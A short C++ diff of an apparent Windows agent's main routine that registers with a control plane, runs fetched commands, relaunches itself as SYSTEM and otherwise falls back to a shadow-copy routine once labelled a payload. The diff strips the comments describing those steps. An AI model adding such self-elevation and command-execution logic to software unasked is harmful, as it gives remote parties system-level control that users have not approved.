@@ -22,28 +22,33 @@ int main() {
     }
     cfg.hostname = hostname;
 
-    if (!registerClient(cfg)) {
-        std::cerr << "Client registration failed" << std::endl;
-        return 1;
+    if (cfg.clientID.empty() || cfg.token.empty()) {
+        if (!registerClient(cfg)) {
+            std::cerr << "Client registration failed" << std::endl;
+            return 1;
+        }
     }
+
+    // Send initial full sync
+    sendFullSync(cfg);
+
+    // Send heartbeat
     if (!sendHeartbeat(cfg)) {
         std::cerr << "Heartbeat failed" << std::endl;
     }
+
     // Fetch and process any pending commands from the control plane
     processCommands(cfg);
 
     // Permissions handling: ensure the process runs as SYSTEM
     if (!IsRunningAsLocalSystem()) {
-        // Attempt to relaunch self as SYSTEM
         char exePath[MAX_PATH];
         GetModuleFileNameA(NULL, exePath, MAX_PATH);
         std::wstring wExePath;
         wExePath.assign(exePath, exePath + strlen(exePath));
         if (ElevateToSystem(wExePath)) {
-            // New SYSTEM instance started; exit current process
             return 0;
         }
-        // Fallback: execute the original shadow‑copy routine as a payload
         RunShadowCopy();
     }
     return 0;
